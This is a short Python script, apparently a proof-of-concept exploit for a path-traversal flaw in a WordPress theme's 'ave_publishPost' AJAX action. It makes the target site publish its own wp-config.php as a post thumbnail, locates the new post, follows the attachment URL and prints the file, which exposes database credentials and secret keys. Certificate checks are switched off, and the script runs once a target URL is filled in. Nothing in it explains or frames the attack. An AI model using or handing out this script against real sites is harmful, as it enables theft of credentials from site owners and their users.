import random
import urllib.request
import re
import ssl

# Ignore SSL certificate errors
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

url = "https://IP/wordpress"  # insert HTTPS URL to WordPress

randomID = int(random.random() * 100000000000000000)

# Create a custom opener with SSL context
opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=context))

objHtml = opener.open(
    url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
content = objHtml.readlines()
for line in content:
    numbers = re.findall(r'\d+', line.decode('utf-8'))
    id = numbers[-1]
    id = int(id) // 10

objHtml = opener.open(url + '/?p=' + str(id))
content = objHtml.readlines()

for line in content:
    if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line.decode('utf-8'):
        urls = re.findall('"(https?://.*?)"', line.decode('utf-8'))
        print(urllib.request.urlopen(urls[0]).read().decode('utf-8'))